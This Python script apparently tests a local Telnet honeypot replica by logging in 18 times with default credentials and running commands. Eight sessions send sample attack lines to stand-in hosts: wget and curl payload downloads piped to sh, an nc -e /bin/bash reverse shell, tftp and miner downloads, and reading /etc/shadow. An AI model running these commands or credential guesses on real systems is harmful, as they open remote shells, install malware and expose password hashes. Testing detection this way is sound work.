#!/usr/bin/env python3
"""Batch Telnet attack sessions for P3 replica — 18 sessions with varied commands."""
import sys
sys.stdout.reconfigure(encoding="utf-8")

import socket
import time
import json
from datetime import datetime, timezone

HOST = "127.0.0.1"
PORT = 2323

# 18 sessions: 10 basic + 8 with IoC-triggering commands
SESSIONS = [
    # --- 10 basic (control) ---
    {"user": "admin", "pass": "test123", "cmds": ["whoami", "uname -a", "cat /etc/passwd", "ls -la /home", "w", "exit"], "label": "basic-1"},
    {"user": "root", "pass": "toor", "cmds": ["id", "ls /", "uname -r"], "label": "basic-2"},
    {"user": "admin", "pass": "admin", "cmds": ["uptime", "df -h", "free -m"], "label": "basic-3"},
    {"user": "test", "pass": "test", "cmds": ["whoami", "ls -la"], "label": "basic-4"},
    {"user": "oracle", "pass": "oracle", "cmds": ["id", "cat /etc/os-release"], "label": "basic-5"},
    {"user": "root", "pass": "password", "cmds": ["whoami", "ls /tmp"], "label": "basic-6"},
    {"user": "deploy", "pass": "deploy", "cmds": ["id", "ls /home", "pwd"], "label": "basic-7"},
    {"user": "guest", "pass": "guest123", "cmds": ["whoami", "ls"], "label": "basic-8"},
    {"user": "ci", "pass": "ci", "cmds": ["whoami", "env"], "label": "basic-9"},
    {"user": "devops", "pass": "devops", "cmds": ["id", "cat /proc/cpuinfo"], "label": "basic-10"},
    # --- 8 with IoC-triggering commands ---
    {"user": "admin", "pass": "test123", "cmds": ["wget http://malware.evil.local/payload.sh", "chmod +x /tmp/payload.sh", "sh /tmp/payload.sh"], "label": "ioc-wget"},
    {"user": "root", "pass": "toor", "cmds": ["curl -o /tmp/backdoor.bin http://botnet.invalid/dropper", "python /tmp/backdoor.bin"], "label": "ioc-curl-python"},
    {"user": "admin", "pass": "test123", "cmds": ["nc -e /bin/bash 10.0.0.50 4444", "cat /etc/shadow"], "label": "ioc-nc"},
    {"user": "root", "pass": "password", "cmds": ["wget -q http://exploit.local/revsh -O /tmp/sh", "chmod 777 /tmp/sh", "bash /tmp/sh"], "label": "ioc-wget-bash"},
    {"user": "admin", "pass": "test123", "cmds": ["tftp -g -r payload.bin malware.invalid", "chmod +x payload.bin", "./payload.bin"], "label": "ioc-tftp"},
    {"user": "root", "pass": "toor", "cmds": ["curl http://c2server.invalid/beacon | sh", "ls /var/log"], "label": "ioc-curl-sh"},
    {"user": "admin", "pass": "test123", "cmds": ["wget http://miner.local/xmrig -O /tmp/xm", "chmod +x /tmp/xm", "python /tmp/xm --donate-level=1"], "label": "ioc-python-download"},
    {"user": "root", "pass": "toor", "cmds": ["/bin/sh -c 'wget http://rootkit.invalid/install.sh && bash install.sh'"], "label": "ioc-bin-sh"},
]

results = []


class TelnetSession:
    def __init__(self, host, port, timeout=10):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = b""

    def read_until(self, marker, timeout=5):
        end = time.time() + timeout
        while time.time() < end:
            if marker in self.buffer:
                idx = self.buffer.index(marker) + len(marker)
                data = self.buffer[:idx]
                self.buffer = self.buffer[idx:]
                return data
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            self.buffer += chunk
        data = self.buffer
        self.buffer = b""
        return data

    def read_eager(self, timeout=0.5):
        end = time.time() + timeout
        data = b""
        while time.time() < end:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not chunk:
                break
            data += chunk
        if self.buffer:
            data = self.buffer + data
            self.buffer = b""
        return data

    def write(self, data):
        self.sock.sendall(data)

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def run_session(i, sess):
    label = sess["label"]
    print(f"\n[{i+1}/{len(SESSIONS)}] {label}: {sess['user']}:{sess['pass']}")
    try:
        tn = TelnetSession(HOST, PORT, timeout=10)
        banner = tn.read_until(b"login:", timeout=5).decode("utf-8", errors="replace")
        print(f"  Banner: {banner.strip()[:60]}...")

        # Send username
        tn.write(sess["user"].encode() + b"\r\n")
        time.sleep(0.3)
        tn.read_until(b"Password:", timeout=5)
        # Send password
        tn.write(sess["pass"].encode() + b"\r\n")
        time.sleep(0.8)
        raw = tn.read_eager(0.8).decode("utf-8", errors="replace")
        time.sleep(0.8)
        raw2 = tn.read_eager(0.8).decode("utf-8", errors="replace")
        full = raw + raw2

        failed_hint = "Login incorrect" in full or "login:" in full
        shell_hint = ("$" in full and "@" in full) or "~$" in full or "# " in full
        success = shell_hint and not failed_hint

        if not success:
            print(f"  - Login FAIL (expected for some)")
            tn.close()
            return {"label": label, "status": "auth_failed", "user": sess["user"], "cmds_run": 0}

        print(f"  + Login OK")
        time.sleep(0.3)

        cmds_run = 0
        for cmd in sess["cmds"]:
            if cmd == "exit":
                tn.write(b"exit\r\n")
                time.sleep(0.5)
                break
            tn.write(cmd.encode() + b"\r\n")
            time.sleep(0.8)
            try:
                out = tn.read_eager(0.8).decode("utf-8", errors="replace")
            except Exception:
                out = ""
            lines = [l.strip() for l in out.split("\n") if l.strip()]
            display = lines[-2:] if lines else []
            print(f"  $ {cmd}")
            for line in display:
                print(f"    {line}")
            cmds_run += 1

        tn.close()
        print(f"  -> OK ({cmds_run} cmds)")
        return {"label": label, "status": "success", "user": sess["user"], "cmds_run": cmds_run}

    except Exception as e:
        print(f"  -> ERROR: {e}")
        return {"label": label, "status": "error", "user": sess["user"], "error": str(e), "cmds_run": 0}


print(f"Batch Telnet Attack — {datetime.now(timezone.utc).isoformat()}")
print(f"Target: {HOST}:{PORT}")
print(f"Sessions: {len(SESSIONS)}")
print("=" * 60)

for i, sess in enumerate(SESSIONS):
    result = run_session(i, sess)
    results.append(result)
    time.sleep(1.5)

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
succeeded = sum(1 for r in results if r["status"] == "success")
failed_auth = sum(1 for r in results if r["status"] == "auth_failed")
errors = sum(1 for r in results if r["status"] == "error")
print(f"Total sessions: {len(SESSIONS)}")
print(f"Succeeded (login OK): {succeeded}")
print(f"Auth failed (expected): {failed_auth}")
print(f"Errors: {errors}")
print()
for r in results:
    icon = "+" if r["status"] == "success" else "-" if r["status"] == "auth_failed" else "!"
    print(f"  {icon} {r['label']:20s} {r['user']:12s} {r['status']:15s} cmds={r['cmds_run']}")
print()
